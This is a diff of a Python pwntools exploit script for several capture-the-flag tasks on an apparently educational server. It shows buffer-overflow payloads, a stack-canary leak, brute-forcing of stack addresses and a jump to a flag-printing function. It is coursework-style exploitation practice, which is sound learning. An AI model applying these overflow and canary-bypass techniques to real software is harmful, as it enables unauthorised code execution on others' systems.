@@ -6,10 +6,9 @@ url = 'ctf21.softwaresecurity.no'
 
 
 def task00(port: int):
-    conn = remote(url, port)
-    first_send = conn.recv(1024)
-    print(first_send)
-    line = b'a' * 16 + b'\x8b\xef\xbe\x79'
+    conn = remote(url, port)  # Connect to url at right port
+    print(conn.recvline()) # Receive "input tekst"
+    line = b'a' * 16 + b'\x8b\xef\xbe\x79' # send payload
     conn.sendline(line)
     print(conn.recvline())
     print(conn.recvline())
@@ -51,21 +50,44 @@ def task03(port: int):
     conn = remote(url, port)
     print(conn.recvline())
     first = b'1' * 32
-    thirty_two_bytes = p64(0x01) * 4
     # buffer begins eca0
     get_flag_Addr = p64(0x00000000004011d6)
-
-    possible = list(map(''.join, itertools.product('0123456789abcdef', repeat=2)))
-
+    #possible = list(map(''.join, itertools.product('0123456789abcdef', repeat=2)))
     #buffer found from bf attack that buffer starts at:
     buffer_start = p64(0x00007fffffffeca0)
     # pt_0 = 00007fffffffecbc
     # canari = 00007fffffffeccc med verdien 55123e1d30298c00
 
-    """
+    #conn = get_possible_addresses(conn, possible)
+
+    #jump_by_eightbits(conn)
+
+    conn.sendline(b'a'*32 + p64(0x00007fffffffecc8))
+    canary = int(conn.recvline().strip(), 16)
+    conn.recvline()
+    payload = b'q' + b'a'*31 + p64(0x00007fffffffeca0) + p64(canary) + p64(0x0) + get_flag_Addr
+    conn.sendline(payload)
+    print(conn.recvline())
+    print(conn.recvline())
+    print(conn.recvline())
+
+
+
+def jump_by_eightbits(conn):
+    list_of_possibles = []
+    for x in range(32):
+        address_space = p64(0x00007fffffffecc0 + 8 * x)
+        conn.sendline(b'a' * 32 + address_space)
+        list_of_possibles.append(address_space)
+        conn.recvline()
+        # print(f"possible canari: {conn.recvline() } \n at adress {address_space}")
+        conn.recvline()
+
+
+def get_possible_addresses(conn, possible):
     for first in range(len(possible)):
         for second in range(0, len(possible)):
-            string_ = "00007fffffff" + "ec"+ possible[second]
+            string_ = "00007fffffff" + "ec" + possible[second]
             bruteforce = p64(int(string_, 16))
             combined_output = b'a' * 32 + bruteforce
             # print(f"I´ve sendt this: {bruteforce}")
@@ -80,41 +102,12 @@ def task03(port: int):
                 print("fail!")
                 conn = connect(url, 7003)
                 conn.recvline()
-            # print(output)
             conn.recvline()
-
-    values = ""
-    """
-    list_of_possibles = []
-    """
-        for x in range(32):
-            address_space = p64(0x00007fffffffecc0 + 8 * x)
-            conn.sendline(b'a'*32 + address_space)
-            list_of_possibles.append(address_space)
-            conn.recvline()
-            # print(f"possible canari: {conn.recvline() } \n at adress {address_space}")
-            conn.recvline()
-    """
-    conn.sendline(b'a'*32 + p64(0x00007fffffffecc8))
-    canary = int(conn.recvline().strip(), 16)
-
-    payload = b'q' + b'a'*31 + get_flag_Addr + p64(canary) + p64(0x0) + get_flag_Addr
-    conn.sendline(payload)
-    print(conn.recvline())
-    print(conn.recvline())
-    print(conn.recvline())
-
-
-def test(port: int):
-    conn = remote(url, port)
-    print(conn.recvline())
-
-    while True:
-        conn.send(b'1' * 32 + b'')
+    return conn
 
 
 if __name__ == '__main__':
-    # task00(7000)
-    # task01(7001)
-    # task02(7002)
-    task03(7003)
+    #task00(7000)
+    #task01(7001)
+    task02(7002)
+    #task03(7003)
